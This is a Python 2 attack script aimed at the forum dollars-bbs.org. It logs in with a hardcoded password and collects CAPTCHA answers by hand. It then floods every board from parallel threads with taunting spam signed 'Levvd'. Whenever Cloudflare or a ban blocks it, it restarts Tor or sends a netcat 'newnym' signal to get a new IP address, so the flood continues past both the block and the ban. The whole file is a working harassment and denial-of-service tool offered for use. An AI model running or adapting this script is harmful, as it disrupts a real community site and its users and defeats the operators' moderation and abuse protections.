#!/usr/bin/python2
import requests,string,random,socks,socket,os,sys,subprocess,time,threading
from bs4 import BeautifulSoup
socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5,"127.0.0.1",9050)
socket.socket = socks.socksocket
def randompassword():
    charlist = string.ascii_letters + string.digits
    password = ""
    for c in range(8):
        password += random.choice(charlist)
    return password
def getimage(html): 
    soup = BeautifulSoup(html)
    img = soup.find("img", class_="threadcaptcha")
    url = "http://dollars-bbs.org" + img["src"]
    return url
def changeip():
    os.system("systemctl restart tor")
def checkforcloudflare():
    print "Checking for cloud flare"
    try:
       r = s.get("http://dollars-bbs.org/main/").text
       if "Attention Required! | CloudFlare" in r:
           print "Fuck. Cloudflare"
           changeip()
           time.sleep(1)
           checkforcloudflare()
       elif "403 - FORBIDDEN" in r:
           print "Fuck, Banned"
           changeip()
           time.sleep(1)
           checkforcloudflare()           
       else:
            print "We are good"
            return r
    except requests.exceptions.RequestException as e:
        print e
        print "Cloudflare. Changing ip"
        os.system("systemctl restart tor.service")
        time.sleep(2)
        checkforcloudflare()
def download(url,key):
    filename = key + ".gif"
    print "Getting " + filename
    r = s.get(url,stream=True)
    with open(filename,"wb") as f:
        for chunk in r.iter_content(chunk_size=1024):
            if chunk:
                f.write(chunk)
    return filename
class NormalThreadSpam(threading.Thread):
    def __init__(self,session,board):
        threading.Thread.__init__(self)
        self.session = session
        self.board = board
    def run(self):
        global switching
        session = self.session
        board = self.board
        r = ""
        boardurl = "http://dollars-bbs.org/%s/kareha.pl" % board
        try:
            r = session.post(boardurl,data=postdata)
        except:
            print "Fuck cloudflare Switching ips" 
            changeip()
            self.run()
        if "Attention Required! | CloudFlare" in r.text:
            print "Fuck cloudflare. Switching ips " + board
            if switching == False:
                switching = True
                os.system("(echo authenticate ''; echo signal newnym; echo quit) | nc localhost 9050")
                switching = False
                self.run()
            else:
                while switching == True:
                    print "Waiting to be switched"
                self.run()
        elif "403 - FORBIDDEN" in r.text:
            print "Fuck, Banned " + board
            if switching == False:
                switching = True
                os.system("(echo authenticate ''; echo signal newnym; echo quit) | nc localhost 9050")
                switching = False
                self.run()
            else:
                while switching == True:
                    print "Waiting to be switched"
            self.run()
        else:
            print "Spamming " + self.board
            self.run()
class MainThreadSpam(threading.Thread):
    def __init__(self,session,data):
        threading.Thread.__init__(self)
        self.session = session
        self.data = postdata
    def run(self):
        session = self.session
        data = self.data
        f = open("captchas.txt","r")
        captchas = [line.strip() for line in f.readlines()]
        for c in captchas:
            print c + "\n"
            captcha,key = c.split(",")
            data["captcha"] = captcha
            session.cookies["captchakey"] = key
            r = ""
            while True:
                try:
                    r = s.post("http://dollars-bbs.org/main/kareha.pl",data=data)
                    break
                except:
                    print "Fuck cloudflare Switching ips" 
                    changeip()
                    time.sleep(1)
            if "Wrong verification code entered." in r.text:
                print "Ooops wrong code"
            if "Attention Required! | CloudFlare" in r.text:
                print "Fuck cloudflare. Switching ips " + board
                changeip()
            elif "403 - FORBIDDEN" in r.text:
                print "Fuck, Banned " + board
                changeip()
            else:
                print "Spamming main"
login = {
    "pw": "baccano"
} 
postdata = {
    "task" : "post",
    "password" : randompassword(),
    "title": "Cloudflare is ass",
    "field_a": "Levvd",
    "name": "",
    "link": "",
    "captcha":"",
    "markup":"html",
    "comment": "Rekt by Levvd. Yell at @Levvd_ :3" + randompassword(),
    "file" : ""
}
boards = ["news","animation","art","comics","films","food","games","literatures","music","personal",
          "sports","tech","random","test","intro","countries","missions","suggestions","vn"]
captchas = 5
s = requests.Session()
s.headers.update({"User-Agent":"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:12.2.1) Gecko/20120616 Firefox/13.0.1 PaleMoon/12.2.2"})
s.post("http://dollars-bbs.org/login.php", data=login)

print "Getting captchas for main"
while captchas > 0:
    f = open("captchas.txt","a")
    ikey = randompassword()
    s.cookies["captchakey"] =ikey
    print s.cookies["captchakey"]
    print checkforcloudflare()
    html = s.get("http://dollars-bbs.org/main/").text
    filename = download(getimage(html),ikey)
    feh = subprocess.Popen(['feh',filename])
    input = raw_input("What is the captcha\n")
    f.write("%s,%s\n" % (input,ikey))
    f.close()
    feh.kill()
    captchas-=1
print "Cleaning up"
#os.system("rm *.gif")
checkforcloudflare()
switching = False
for board in boards:
    thread = NormalThreadSpam(s,board)
    thread.start()
mainthread = MainThreadSpam(s,postdata)
mainthread.start()